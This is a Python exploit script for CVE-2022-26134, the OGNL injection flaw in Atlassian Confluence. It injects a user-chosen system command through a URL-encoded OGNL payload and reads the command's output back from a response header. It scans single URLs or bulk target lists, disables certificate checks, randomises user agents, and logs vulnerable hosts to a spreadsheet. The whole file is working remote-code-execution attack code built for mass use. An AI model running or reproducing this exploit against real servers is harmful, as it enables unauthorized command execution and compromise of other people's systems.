import os
import random
import time
import requests
import argparse
import xlsxwriter
from alive_progress import alive_bar

def banner():
    CVE_2022_26134Logo = """
   _____   _____   ___ __ ___ ___   ___  __ _ _____ _  
 / __\ \ / / __|_|_  )  \_  )_  )_|_  )/ // |__ / | | 
| (__ \ V /| _|___/ / () / / / /___/ // _ \ ||_ \_  _|
 \___| \_/ |___| /___\__/___/___| /___\___/_|___/ |_| 
    
                  CVE-2022-26134 - Confluence OGNL injection vulnerability
Author: yT
"""
    return print(CVE_2022_26134Logo)

def addHttps(url, bar=None):
    urlHttps = "https://" + str(url)
    main_file(urlHttps, command)
    bar()

def addHttp(url, bar=None):
    urlHttp = "http://" + str(url)
    main_file(urlHttp, command)
    bar()

def openFile(file):    # 批量处理漏洞地址
    with open(file, 'r') as file:
        lines = file.readlines()
    with alive_bar(len(lines), enrich_print=False) as bar:
        if len(lines) != 0:
            for i in lines:
                i = i.rstrip('\n')
                if "http://" in i:
                    main_file(i, command)
                    bar()
                elif "https://" in i:
                    main_file(i, command)
                    bar()
                else:
                    # 为文件中无http默认头的地址添加http头
                    addHttp(i, bar)
                    addHttps(i, bar)
        else:
            print('空文件')

def getHtmlResult(url, command):
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/68.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) '
        'Gecko/20100101 Firefox/68.0',
        'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/68.0']
    head = {
        "User-Agent": random.choice(user_agents)
    }
    options = ('/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22' + command + '%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Qualys-Response%22%2C%23a%29%29%7D/')
    target = url + options
    try:
        requests.packages.urllib3.disable_warnings()  # 解决证书告警问题
        result = requests.get(target, headers=head, allow_redirects=False, timeout=10, verify=False)  # allow_redirects=False禁止自动跳转302，verify=False解决https连接报错
        return result.headers   # 获取返回头
    except:
        return None

def createXlsx():
    nowTime = time.strftime("%Y%m%d%H%M%S", time.localtime())
    filename_xls = nowTime + '.xlsx'
    outXls(filename_xls)

def outXls(filename_xls):
    with xlsxwriter.Workbook(filename_xls) as workbook:
        worksheet = workbook.add_worksheet('CVE-2022-26134')
        bold = workbook.add_format({"bold":True,"valign":"center"})
        worksheet.set_column('A:A', 30)
        worksheet.write('A1', 'Url', bold)
        row = 1
        col = 0
        for vaule in date:
            worksheet.write(row, col, vaule)
            row = row + 1
    print('ouput path:')
    path_xls = os.path.join(os.getcwd(), filename_xls)
    print("结果文件输出路径为:{0}".format(path_xls))

def main_file(target, command):
    response = getHtmlResult(target, command)
    if response:
        if 'X-Qualys-Response' in response:
            print("\n")
            print("[+]{0}:CVE-2022-26134 Successfully".format(target))
            print(response['X-Qualys-Response'])
            date.append(target)

def main(target, command):
    response = getHtmlResult(target, command)
    if response:
        if 'X-Qualys-Response' in response:
            print("\n")
            print("[+]{0}:CVE-2022-26134 Successfully".format(target))
            print(response['X-Qualys-Response'])
            date.append(target)
        else:
            print("\n")
            print("[-]{0}:CVE-2022-26134 Failed".format(target))
    else:
        print("\n")
        print("[-]{0}:CVE-2022-26134 Failed".format(target))

if __name__ == '__main__':
    banner()
    urls = []
    date = []
    parser = argparse.ArgumentParser(prog='CVE-2022-26134',
                                     description='python3 CVE-2022-26134.py -h')
    target = parser.add_argument_group('Target')
    target.add_argument('-u', dest='url', type=str, help="Input your url target")
    target.add_argument('-f', dest='file', type=str, help="Input your target's file")
    command = parser.add_argument_group('Command')
    command.add_argument('-c', dest='command', type=str, help='system command')
    output = parser.add_argument_group('Output')
    output.add_argument('-o', dest='output', type=str, default="xlsx", help='Select the output format')
    args = parser.parse_args()
    target = args.url
    file = args.file
    command = args.command
    if file:
        openFile(file)
        createXlsx()
    else:
        main(target, command)